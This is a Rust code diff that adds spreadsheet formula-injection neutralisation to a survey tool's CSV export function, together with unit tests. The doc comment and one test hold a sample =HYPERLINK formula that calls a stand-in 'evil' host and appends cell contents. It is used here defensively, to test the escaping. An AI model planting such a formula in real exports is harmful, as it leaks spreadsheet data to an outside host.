@@ -44,12 +44,37 @@ pub fn export_csv(project: &Project, path: &Path) -> Result<()> {
     Ok(())
 }
 
-/// Escape a string for CSV
+/// Escape a string for CSV, and defuse spreadsheet formula injection.
+///
+/// Two separate jobs:
+///
+/// 1. **RFC 4180 quoting** for a field containing a delimiter, a quote or a line
+///    break. `\r` counts: a lone CR ends a record in some readers, so a comment
+///    holding one would otherwise split a row.
+///
+/// 2. **Formula neutralisation.** Excel, LibreOffice and Sheets evaluate a cell
+///    whose text begins with `=`, `+`, `-`, `@`, tab or CR - quoting does NOT
+///    stop this, the formula is parsed after the CSV layer is stripped. The two
+///    fields that reach here (`section_name`, `shot.comment`) are attacker
+///    controlled: they come verbatim out of an imported `.tml` / `.dat` /
+///    `.srv`, so a comment of `=HYPERLINK("http://evil/"&A1,"ok")` would run on
+///    open. A leading apostrophe is the standard mitigation (OWASP).
+///
+/// The `-` case is deliberately included even though it costs a cosmetic
+/// apostrophe on a legitimate comment like `-2m to the floor`: `-1+1` is a
+/// formula too, and there is no way to tell the two apart without guessing.
 fn escape_csv(s: &str) -> String {
-    if s.contains(',') || s.contains('"') || s.contains('\n') {
-        format!("\"{}\"", s.replace('"', "\"\""))
+    // Order matters: neutralise first, then quote, so the apostrophe is inside
+    // the quotes rather than stranded outside them.
+    let neutralised = if s.starts_with(['=', '+', '-', '@', '\t', '\r']) {
+        format!("'{s}")
     } else {
         s.to_string()
+    };
+    if neutralised.contains([',', '"', '\n', '\r']) {
+        format!("\"{}\"", neutralised.replace('"', "\"\""))
+    } else {
+        neutralised
     }
 }
 
@@ -102,6 +127,30 @@ mod tests {
         assert_eq!(escape_csv("a\"b"), "\"a\"\"b\"");
         assert_eq!(escape_csv("a\nb"), "\"a\nb\"");
         assert_eq!(escape_csv("a,\"b\""), "\"a,\"\"b\"\"\"");
+    }
+
+    #[test]
+    fn test_escape_csv_neutralises_spreadsheet_formulas() {
+        // A comment or section name comes verbatim out of an imported survey
+        // file, so it is attacker-controlled. Quoting alone does NOT stop a
+        // formula - Excel parses the cell text after the CSV layer is stripped.
+        assert_eq!(
+            escape_csv(r#"=HYPERLINK("http://evil/","ok")"#),
+            r#""'=HYPERLINK(""http://evil/"",""ok"")""#,
+            "the apostrophe must land INSIDE the quotes"
+        );
+        for lead in ['=', '+', '-', '@', '\t'] {
+            let field = format!("{lead}1+1");
+            assert_eq!(escape_csv(&field), format!("'{field}"), "lead {lead:?}");
+        }
+        // A lone CR would end the record in some readers, so it quotes too.
+        assert_eq!(escape_csv("a\rb"), "\"a\rb\"");
+        assert_eq!(escape_csv("\rlead"), "\"'\rlead\"");
+        // Text that merely CONTAINS an operator is left alone - only the first
+        // character decides, matching how the spreadsheets themselves parse.
+        assert_eq!(escape_csv("2+2 m to the floor"), "2+2 m to the floor");
+        assert_eq!(escape_csv("Main"), "Main");
+        assert_eq!(escape_csv(""), "");
     }
 
     #[test]
